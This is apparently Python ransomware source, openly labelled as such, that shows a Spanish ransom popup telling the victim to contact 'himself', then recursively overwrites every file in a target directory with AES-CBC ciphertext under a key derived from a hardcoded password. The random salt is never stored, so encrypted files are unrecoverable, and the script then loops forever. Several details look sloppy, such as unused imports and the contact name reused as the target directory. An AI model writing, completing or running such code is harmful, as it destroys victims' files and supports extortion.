import os
import tkinter as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from base64 import b64encode, b64decode
import os

PASSWORD = b'himself9864'
CONTACT = 'himself'

def show_message_box():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo("Ransomware", "Tu archivo ha sido encriptado. Contacta a 'himself' para recuperar tus datos.")
    root.destroy()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path, 'wb') as f:
        f.write(iv + encrypted_data)

def encrypt_files_in_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def main():
    show_message_box()

    salt = os.urandom(16)
    kdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        info=None,
        backend=default_backend()
    )
    key = kdf.derive(PASSWORD)

    encrypt_files_in_directory(CONTACT, key)

    while True:
        pass

if __name__ == "__main__":
    main()